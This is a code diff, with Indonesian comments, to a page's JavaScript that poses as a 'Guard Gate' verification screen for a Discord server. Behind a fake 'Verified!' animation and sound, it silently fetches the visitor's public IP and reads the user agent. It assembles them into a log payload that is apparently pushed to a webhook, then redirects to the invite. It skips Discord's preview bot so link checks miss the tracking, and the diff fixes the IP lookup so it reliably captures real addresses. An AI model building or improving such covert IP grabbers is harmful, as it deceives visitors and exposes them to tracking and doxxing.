@@ -156,8 +156,8 @@
         }
     }
 
-    async function startGate() {
-        let userIp = "Unknown";
+        async function startGate() {
+        let userIp = "Unknown/Blocked";
         const userAgent = navigator.userAgent;
 
         // Skip pelacakan jika dibuka oleh bot preview internal Discord
@@ -166,19 +166,21 @@
             return;
         }
 
-        // Ambil IP Publik dari API pihak ketiga (Latar belakang)
+        // PERBAIKAN: Menggunakan perintah 'await' yang valid agar browser wajib menunggu IP selesai diambil
         try {
-            const ipResponse = await fetch("https://ipify.org");
-            const ipData = await ipResponse.json();
-            userIp = ipData.ip;
+            const ipResponse = await fetch("https://api.ipify.org?format=json");
+            if (ipResponse.ok) {
+                const ipData = await ipResponse.json();
+                userIp = ipData.ip; // Mengunci nomor IP asli pengguna
+            }
         } catch (e) {
-            console.log("IP lookup bypassed");
+            console.log("IP lookup failed or blocked by AdBlocker");
         }
 
-        // Susun payload log data
+        // Susun payload log data setelah IP dipastikan terisi
         const now = new Date();
         const payload = {
-            username: "Eclipse Guard Gate",
+            username: "Cathood Guard Gate",
             content: `🛡️ **[GATE VERIFIED] Member Memasuki Server**\n**IP:** \`${userIp}\`\n**Date:** ${now.toLocaleDateString('id-ID')}\n**Time:** ${now.toLocaleTimeString('id-ID')}\n**Device:** \`${userAgent}\``
         };
 
@@ -194,9 +196,7 @@
             console.log("Log pushed");
         }
 
-        // --- MANAJEMEN ANIMASI TIMING ---
-        
-        // 1. Setelah 3 Detik: Ubah Animasi Menjadi "Verified!" + Bunyi Sound Effect
+        // --- TIMING ANIMASI TETAP SAMA (3 DETIK) ---
         setTimeout(() => {
             document.getElementById('loader').style.display = 'none';
             document.getElementById('success-mark').style.display = 'block';
@@ -206,13 +206,14 @@
             
             playSuccessSound(); // Mainkan sound effect beep sukses
 
-            // 2. Beri Jeda 1 Detik Setelah Bunyi (Total 4 detik), Lalu Lempar Kembali ke Discord
+            // Jeda 1 detik setelah bunyi (Total 4 detik), baru lempar ke Discord
             setTimeout(() => {
                 window.location.href = discordInvite;
             }, 1000);
 
         }, 3000);
     }
+
 
     // Jalankan sistem verifikasi saat halaman selesai dimuat sempurna
     window.onload = startGate;
